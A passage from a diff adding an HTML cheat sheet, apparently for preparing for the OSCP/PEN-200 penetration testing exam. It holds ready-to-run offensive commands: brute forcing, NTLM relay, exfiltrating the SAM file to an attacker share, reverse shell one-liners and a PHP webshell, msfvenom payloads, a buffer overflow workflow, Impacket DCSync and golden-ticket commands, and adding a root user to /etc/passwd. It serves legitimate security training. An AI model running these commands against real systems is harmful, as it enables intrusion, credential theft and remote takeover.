+sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
+# Trigger auth via UNC, link, etc. → SAM dump or shell</code></pre>
+
+  <h3>Online Brute Force</h3>
+  <pre data-lang="bash"><code># SSH:
+hydra -l root -P rockyou.txt ssh://&lt;TARGET_IP&gt; -t 4
+
+# HTTP POST:
+hydra -l admin -P rockyou.txt &lt;TARGET_IP&gt; http-post-form \
+    "/login.php:username=^USER^&amp;password=^PASS^:Invalid"
+
+# SMB spray (check lockout first!):
+crackmapexec smb &lt;TARGET_IP&gt; -u stephanie -p 'Password123' --pass-pol
+crackmapexec smb &lt;TARGET_IP&gt; -u domain_users.txt -p 'Password123' --continue-on-success</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S9 ═══════════════════ -->
+<section class="section" id="s9">
+  <div class="section-header">
+    <span class="section-num">09</span>
+    <h2>File Transfer Cheatsheet</h2>
+  </div>
+
+  <h3>Linux → Windows</h3>
+  <pre data-lang="powershell"><code># PowerShell:
+IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/shell.ps1')
+(New-Object Net.WebClient).DownloadFile('http://&lt;LHOST&gt;/file.exe','C:\Temp\file.exe')
+Invoke-WebRequest -Uri http://&lt;LHOST&gt;/file.exe -OutFile C:\Temp\file.exe
+
+# Certutil:
+certutil -urlcache -split -f http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
+
+# BITS:
+bitsadmin /transfer job /download /priority normal http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
+
+# SMB (setup on attacker):
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
+copy \\&lt;LHOST&gt;\share\file.exe C:\Temp\</code></pre>
+
+  <h3>Windows → Linux (Exfil)</h3>
+  <pre data-lang="powershell"><code># Via SMB:
+copy C:\Windows\System32\config\SAM \\&lt;LHOST&gt;\share\SAM
+
+# Base64 encode → copy/paste:
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))
+# Decode on attacker:
+echo '&lt;BASE64&gt;' | base64 -d &gt; file.txt</code></pre>
+
+  <h3>Linux → Linux</h3>
+  <pre data-lang="bash"><code>python3 -m http.server 80
+wget http://&lt;LHOST&gt;/file; curl http://&lt;LHOST&gt;/file -o file
+scp file.txt user@&lt;TARGET_IP&gt;:/tmp/
+# Netcat:
+nc -lvnp 4444 &gt; file          # receiver
+nc &lt;IP&gt; 4444 &lt; file           # sender
+# Base64:
+base64 -w0 file.exe; echo '&lt;B64&gt;' | base64 -d &gt; file.exe</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S10 ═══════════════════ -->
+<section class="section" id="s10">
+  <div class="section-header">
+    <span class="section-num">10</span>
+    <h2>Shells &amp; Upgrades</h2>
+  </div>
+
+  <h3>Reverse Shell One-Liners</h3>
+  <pre data-lang="bash"><code># Bash:
+bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1
+
+# Python3:
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("&lt;LHOST&gt;",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PHP webshell:
+&lt;?php system($_GET["cmd"]); ?&gt;
+
+# Netcat (mkfifo):
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; 4444 &gt;/tmp/f
+
+# msfvenom payloads:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f aspx -o shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f war -o shell.war</code></pre>
+
+  <h3>Shell Upgrade — Linux TTY</h3>
+  <pre data-lang="bash"><code># Method 1: Python PTY (most reliable)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm; stty rows 48 columns 190
+
+# Method 2: Script
+script /dev/null -c bash
+# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+
+# Method 3: Socat (best quality)
+# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
+# Victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;LHOST&gt;:4444</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S11 ═══════════════════ -->
+<section class="section" id="s11">
+  <div class="section-header">
+    <span class="section-num">11</span>
+    <h2>Exploit Development (BOF Reference)</h2>
+  </div>
+
+  <h3>Windows x86 Stack Buffer Overflow</h3>
+  <pre data-lang="python"><code># Step 1: Find crash size (fuzz in increments)
+# Step 2: Exact offset
+msf-pattern_create -l &lt;CRASH_LENGTH&gt;
+# Immunity: !mona findmsp -distance &lt;CRASH_LENGTH&gt;
+
+# Step 3: Verify EIP control
+# payload = b"A" * OFFSET + b"B" * 4 + b"C" * (2000 - OFFSET - 4)
+# EIP = 42424242 ✓
+
+# Step 4: Bad chars
+# !mona bytearray -b "\x00"
+# Send all chars; compare dump
+# !mona compare -f C:\mona\bytearray.bin -a &lt;ESP_ADDRESS&gt;
+
+# Step 5: JMP ESP
+# !mona jmp -r esp -cpb "\x00\x0a\x0d"
+# Pick no-ASLR/DEP/SafeSEH module address
+
+# Step 6: Shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 \
+    -f python -b "\x00\x0a\x0d" EXITFUNC=thread
+
+# Step 7: Final exploit
+from struct import pack
+payload = b"A" * offset + pack("&lt;I", jmp_esp) + b"\x90" * 16 + shellcode</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S12 ═══════════════════ -->
+<section class="section" id="s12">
+  <div class="section-header">
+    <span class="section-num">12</span>
+    <h2>Common CVEs &amp; Exploits</h2>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>CVE / Exploit</th><th>Target</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>MS17-010 EternalBlue</td><td>Win7/2008 R2 (SMB v1)</td><td><span class="impact">→ SYSTEM</span></td></tr>
+        <tr><td>CVE-2019-0708 BlueKeep</td><td>Win7/2008 RDP</td><td><span class="impact">→ RCE/SYSTEM</span></td></tr>
+        <tr><td>CVE-2021-41773</td><td>Apache 2.4.49 PATH traversal</td><td><span class="impact">→ RCE</span></td></tr>
+        <tr><td>CVE-2021-3156 Baron Samedit</td><td>sudo &lt; 1.9.5p2</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2021-4034 PwnKit</td><td>pkexec all distros</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2022-0847 DirtyPipe</td><td>kernel 5.8–5.16.11</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2016-5195 DirtyCow</td><td>kernel &lt; 4.8.3</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2021-44228 Log4Shell</td><td>Log4j 2.x Java</td><td><span class="impact">→ RCE</span></td></tr>
+        <tr><td>CVE-2021-1675 PrintNightmare</td><td>Win2019/10</td><td><span class="impact">→ SYSTEM/RCE</span></td></tr>
+        <tr><td>CVE-2022-26134 Confluence</td><td>OGNL injection 7.4.17</td><td><span class="impact">→ RCE</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>SearchSploit Workflow</h3>
+  <pre data-lang="bash"><code>searchsploit apache 2.4
+searchsploit "windows smb" remote
+searchsploit -w openssh 7.2           # Show Exploit-DB URL
+searchsploit -m 47837                 # Copy exploit to CWD
+searchsploit -x 47837                 # Examine without copying
+searchsploit -u                       # Update DB</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S13 ═══════════════════ -->
+<section class="section" id="s13">
+  <div class="section-header">
+    <span class="section-num">13</span>
+    <h2>Exam Day Tips</h2>
+  </div>
+
+  <h3>Before Starting (15 min prep)</h3>
+  <ul class="checklist">
+    <li>VPN connected — verify routing: ping &lt;DC_IP&gt;</li>
+    <li>Note all IPs: DC, MS01, MS02, Box1, Box2, Box3</li>
+    <li>Update /etc/hosts with all IPs</li>
+    <li>Create loot structure: <code>mkdir -p ~/exam/{ad/{ms01,ms02,dc},box{1,2,3}}/{scans,loot,exploits,screenshots}</code></li>
+    <li>Start nmap scans on ALL targets immediately</li>
+    <li>Open notes per machine (CherryTree / Obsidian)</li>
+    <li>Screenshot tool ready (Flameshot: <code>flameshot gui</code>)</li>
+    <li>Start tmux: 1 window per machine</li>
+    <li>Write provided AD credentials FIRST in notes</li>
+  </ul>
+
+  <h3>Critical Exam Rules</h3>
+  <pre data-lang="bash"><code># Every flag screenshot MUST show:
+# Linux:
+cat /root/proof.txt &amp;&amp; whoami &amp;&amp; hostname &amp;&amp; ip addr show
+
+# Windows:
+type C:\Users\Administrator\Desktop\proof.txt &amp; whoami &amp; hostname &amp; ipconfig /all</code></pre>
+
+  <div class="callout red">
+    <strong>Metasploit:</strong> ONLY 1 machine. Choose wisely — use on a stuck standalone, not on AD (manual AD is better for report anyway).
+  </div>
+
+  <h3>Stuck? 15-Point Reset Checklist</h3>
+  <ul class="checklist">
+    <li>Did full port scan finish? (<code>-p-</code> not just top 1000)</li>
+    <li>Did UDP scan run? (SNMP=161 especially)</li>
+    <li>Read ALL web page source code? (Ctrl+U in browser)</li>
+    <li>Checked robots.txt, /.git, /.env, /backup?</li>
+    <li>Tried ALL found credentials on ALL services?</li>
+    <li>Default credentials tried? (admin:admin, admin:password)</li>
+    <li>Exact version numbers googled for CVEs?</li>
+    <li>searchsploit run on every service+version?</li>
+    <li>All SMB shares checked and files downloaded?</li>
+    <li>SQL injection tested on every input field?</li>
+    <li>LFI tested on every file/page parameter?</li>
+    <li>linpeas/winpeas output fully read? (especially yellow/red)</li>
+    <li>sudo -l, SUID, capabilities, cron all checked?</li>
+    <li>Interesting file search done? (.conf, .bak, history files)</li>
+    <li>Is there a simpler path I'm overthinking?</li>
+  </ul>
+
+  <h3>AD-Specific Tips</h3>
+  <ul class="checklist">
+    <li>Start with provided creds → BloodHound FIRST</li>
+    <li>Check ALL user descriptions for passwords (very common in OSCP)</li>
+    <li>Check SYSVOL/GPP within first 10 minutes</li>
+    <li>Kerberoast + AS-REP roast immediately</li>
+    <li>Password reuse is extremely common — spray everywhere</li>
+    <li>BloodHound "Shortest Path to DA" → follow it literally</li>
+    <li>Any GenericAll/WriteDACL/GenericWrite ACE → exploit immediately</li>
+    <li>Check MSSQL linked servers — common lateral movement path</li>
+    <li>After owning MS01 → re-run SharpHound from inside</li>
+  </ul>
+
+  <h3>Common Rabbit Holes (Avoid)</h3>
+  <div class="callout red">
+    <strong>✗ Kernel exploits</strong> before trying anything else &nbsp;|&nbsp;
+    <strong>✗ SSH brute force</strong> with full rockyou &nbsp;|&nbsp;
+    <strong>✗ Ignoring UDP</strong> entirely &nbsp;|&nbsp;
+    <strong>✗ Spending &gt;45 min</strong> on one vector &nbsp;|&nbsp;
+    <strong>✗ Forgetting</strong> PS history (ConsoleHost_history.txt) &nbsp;|&nbsp;
+    <strong>✗ Not checking</strong> web.config for DB creds &nbsp;|&nbsp;
+    <strong>✗ Giving up</strong> without GTFObins on every SUID
+  </div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S14 ═══════════════════ -->
+<section class="section" id="s14">
+  <div class="section-header">
+    <span class="section-num">14</span>
+    <h2>Proof Collection Checklist</h2>
+  </div>
+
+  <h3>Required Screenshot Commands</h3>
+  <pre data-lang="bash"><code># Linux local.txt (unprivileged):
+cat /home/&lt;USERNAME&gt;/local.txt &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; ip addr show
+
+# Linux proof.txt (root):
+cat /root/proof.txt &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; ip addr show
+
+# Windows local.txt:
+type C:\Users\&lt;USERNAME&gt;\Desktop\local.txt &amp; whoami &amp; hostname &amp; ipconfig
+
+# Windows proof.txt (SYSTEM / Administrator):
+type C:\Users\Administrator\Desktop\proof.txt &amp; whoami /all &amp; hostname &amp; ipconfig /all
+
+# If not found:
+find / -name "*.txt" 2&gt;/dev/null | xargs grep -l "OS{" 2&gt;/dev/null
+dir /s /b C:\*.txt 2&gt;nul | findstr "local\|proof"</code></pre>
+
+  <h3>Points Tracker</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Machine</th><th>Flag</th><th>Points</th><th>Flag Value</th><th>Screenshot</th></tr></thead>
+      <tbody>
+        <tr><td>AD MS01</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>AD MS02</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>AD DC01</td><td>proof.txt</td><td>20 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 1</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 1</td><td>proof.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 2</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 2</td><td>proof.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 3</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 3</td><td>proof.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout green">
+    <strong>TOTAL: ___ / 100 pts &nbsp;|&nbsp; PASS THRESHOLD: 70 pts</strong>
+  </div>
+
+  <h3>Pre-Report Checks</h3>
+  <ul class="checklist">
+    <li>All screenshots show: flag + whoami + hostname + IP</li>
+    <li>Notes detailed enough to recreate each attack step</li>
+    <li>All commands documented for 24hr report</li>
+    <li>Metasploit NOT used on more than 1 machine</li>
+    <li>Report template ready</li>
+  </ul>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S15 ═══════════════════ -->
+<section class="section" id="s15">
+  <div class="section-header">
+    <span class="section-num">15</span>
+    <h2>Quick Reference Card</h2>
+  </div>
+
+  <h3>Listeners</h3>
+  <pre data-lang="bash"><code>nc -lvnp 4444
+rlwrap nc -lvnp 4444      # With readline</code></pre>
+
+  <h3>Impacket Cheatsheet</h3>
+  <pre data-lang="bash"><code>psexec.py dom/user:pass@&lt;IP&gt;                          # SYSTEM via SMB
+wmiexec.py dom/user:pass@&lt;IP&gt;                         # semi-interactive WMI
+smbexec.py dom/user:pass@&lt;IP&gt;                         # no binary on disk
+
+# Hash (PTH):
+psexec.py dom/user@&lt;IP&gt; -hashes :&lt;NTLM_HASH&gt;
+wmiexec.py dom/user@&lt;IP&gt; -hashes :&lt;NTLM_HASH&gt;
+
+# AD attacks:
+GetUserSPNs.py dom/user:pass -dc-ip &lt;DC_IP&gt; -request   # Kerberoast
+GetNPUsers.py dom/user:pass -dc-ip &lt;DC_IP&gt; -request    # AS-REP
+secretsdump.py dom/user:pass@&lt;DC_IP&gt; -just-dc          # DCSync
+getST.py -spn cifs/&lt;FQDN&gt; -impersonate Admin dom/user:pass  # S4U2Self
+ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;SID&gt; -domain dom Admin</code></pre>
+
+  <h3>netexec (nxc) Cheatsheet</h3>
+  <pre data-lang="bash"><code>nxc smb &lt;IP&gt; -u user -p pass                            # Test creds
+nxc smb &lt;IP&gt; -u user -H &lt;NTLM_HASH&gt;                    # PTH
+nxc smb &lt;SUBNET&gt;/24 -u user -p pass --continue-on-success
+nxc smb &lt;IP&gt; -u user -p pass --shares --users --pass-pol
+nxc smb &lt;IP&gt; -u user -p pass --sam --lsa
+nxc smb &lt;IP&gt; -u user -p pass -M lsassy
+nxc smb &lt;IP&gt; -u user -p pass -M gpp_password
+nxc smb &lt;IP&gt; -u user -p pass -x "whoami"
+nxc winrm &lt;IP&gt; -u user -p pass
+nxc mssql &lt;IP&gt; -u sa -p pass --local-auth
+nxc mssql &lt;IP&gt; -u sa -p pass -q "SELECT @@version"</code></pre>
+
+  <h3>GTFObins Quick Reference</h3>
+  <pre data-lang="bash"><code>sudo find . -exec /bin/bash \; -p
+python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
+perl -e 'exec "/bin/bash"'
+awk 'BEGIN {system("/bin/bash")}'
+sudo vim -c ':!/bin/bash'
+sudo less /etc/hosts → !/bin/bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd</code></pre>
+
+  <h3>Key File Locations</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>OS</th><th>Path</th><th>Why</th></tr></thead>
+      <tbody>
+        <tr><td>Linux</td><td>/etc/shadow</td><td>Hashes</td></tr>
+        <tr><td>Linux</td><td>/home/*/.bash_history</td><td>Command history (GOLD)</td></tr>
+        <tr><td>Linux</td><td>/home/*/.ssh/id_rsa</td><td>Private keys</td></tr>
+        <tr><td>Linux</td><td>/var/www/html/</td><td>Web configs / DB creds</td></tr>
+        <tr><td>Windows</td><td>C:\Windows\System32\config\SAM</td><td>Local hashes</td></tr>
+        <tr><td>Windows</td><td>C:\Windows\NTDS\ntds.dit</td><td>AD hashes (DC)</td></tr>
+        <tr><td>Windows</td><td>C:\inetpub\wwwroot\web.config</td><td>DB/app creds</td></tr>
+        <tr><td>Windows</td><td>PSReadLine\ConsoleHost_history.txt</td><td>PS history (GOLD)</td></tr>
+        <tr><td>Windows</td><td>C:\Windows\Panther\unattend.xml</td><td>Autologon creds</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ FOOTER ═══════════════════ -->
+<footer>
+  <div>
+    <span>OSCP+</span> Complete Exam Checklist &amp; Attack Chains
+  </div>
+  <div>PEN-200 v2025-26 &nbsp;|&nbsp; <span>Enumerate everything. Try harder.</span></div>
+</footer>
+
+</div>
+</body>
+</html>
